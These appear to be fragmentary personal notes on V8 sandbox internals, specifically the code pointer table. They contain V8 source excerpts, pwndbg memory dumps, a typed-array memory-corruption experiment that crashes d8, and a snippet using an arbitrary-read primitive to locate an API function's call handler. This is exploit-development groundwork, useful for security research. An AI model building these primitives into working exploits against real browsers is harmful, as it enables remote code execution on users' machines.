
How the sandbox decoder pointers?

- [External pointer](#external-pointer)
- [Code Pointer](#code-pointer)


## external pointer

## code pointer

```js


// src/sandbox/code-pointer-table-inl.h:24

void CodePointerTableEntry::MakeCodePointerEntry(Address code,
                                                 Address entrypoint,
                                                 CodeEntrypointTag tag,
                                                 bool mark_as_alive) {
//....
  if (mark_as_alive) code |= kMarkingBit;
  entrypoint_.store(entrypoint ^ tag, std::memory_order_relaxed);
  code_.store(code, std::memory_order_relaxed);
}
/// ==================================================
pwndbg> p code
$2 = 0x3440024f3ec

// 
pwndbg> p code
$3 = 0x3440024f428
pwndbg> p code
$4 = 0x3440024f464

v8::internal::CodePointerTableEntry::MakeCodePointerEntry (this=0x7fff90010050, code=code@entry=0x3440024f518, entrypoint=entrypoint@entry=0x0, tag=tag@entry=v8::internal::kDefaultCodeEntrypointTag, mark_as_alive=0x0)
/// ====================================================================

// code table
pwndbg> x/30gx 0x7fff90010030
0x7fff90010030:	0x00ff7fff7f4819c0	0x000003440024f4a0
0x7fff90010040:	0x00ff7fff7f482180	0x000003440024f4dc
0x7fff90010050:	0x00ff7fff7f482340	0x000003440024f518

$6 = (std::__Cr::atomic<unsigned long> *) 0x7fff90010008

//===============
0x1a9700283979: [Map] in OldSpace
 - map: 0x1a97002816d9 <MetaMap (0x1a9700281729 <NativeContext[295]>)>
 - type: JS_TYPED_ARRAY_TYPE
```

Offset `0x298d0b` is a magic... When I changed data at JSTypedArray's elements + `0x298d0b` => the program decodes function call is fail
```js
function foo() {
    const v11 = new Int8Array(150);
    Object(v11,...v11,v11);
  }
  
  foo();
  const dummy = new Int8Array(150);
  %DebugPrint(dummy);
  %SystemBreak();
  
  foo();
/// ================================================
DebugPrint: 0x1a970004a3a9: [JSTypedArray]
 - map: 0x1a9700283979 <Map[76](INT8ELEMENTS)> [FastProperties]
 - prototype: 0x1a9700283a0d <Object map = 0x1a97002839a1>
 - elements: 0x1a9700000ec1 <ByteArray[0]> [INT8ELEMENTS]
/// ================================================
pwndbg> x/20wx 0x1a9700000ec1+0x298d0b
0x1a9700299bcc:	0x00299aed	0x00281729	0x00048e4d	0x0004a3a9
0x1a9700299bdc:	0x00281ea1	0x00000725	0x00000725	0x00209801
pwndbg> set *0x1a9700299bcc=0xfffffff
pwndbg> c
Continuing.

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
v8::internal::HeapObject::map_word (this=0x7fffffffd218, cage_base=..., tag=...) at ../../src/objects/objects-inl.h:1271
1271	  return MapField::Relaxed_Load_Map_Word(cage_base, *this);
//==========================================================
pwndbg> bt
#0  v8::internal::HeapObject::map_word (this=0x7fffffffd218, cage_base=..., tag=...) at ../../src/objects/objects-inl.h:1271
#1  v8::internal::HeapObject::map (this=0x7fffffffd218, cage_base=...) at ../../src/objects/objects-inl.h:1098
#2  v8::internal::HeapObject::HeapObjectPrint (this=0x7fffffffd218, os=...) at ../../src/diagnostics/objects-printer.cc:127
#3  0x00007ffff6126e26 in v8::internal::Print<(v8::internal::HeapObjectReferenceType)0, unsigned long> (ptr=..., os=...) at ../../third_party/libc++/src/include/ostream:787
#4  0x00007ffff60371b9 in v8::internal::CheckObjectType (raw_value=0x1a97ffffffff, raw_type=<optimized out>, raw_location=0x1a97000202d5) at ../../src/objects/object-type.cc:78
#5  0x00007fff7f5111f4 in ?? ()
#6  0x00007fffffffd3a8 in ?? ()

```

```js
let addr2 = v8_read64(store_sfi-1n+0x30n) & 0xffffffffn;
let store_function_data = v8_read64(addr2+7n); // function_data 

/// =========================================================================
// https://github.com/lanleft/v8/blob/master/v8/src/builtins/builtins-api.cc#L232
V8_WARN_UNUSED_RESULT static Tagged<Object>
HandleApiCallAsFunctionOrConstructorDelegate(Isolate* isolate,
                                             bool is_construct_call,
                                             BuiltinArguments args) {
  Handle<Object> receiver = args.receiver();
  Tagged<Object> handler =
      constructor->shared()->api_func_data()->GetInstanceCallHandler(); //function_data+0x28
// ===============================================================
                                             }

```

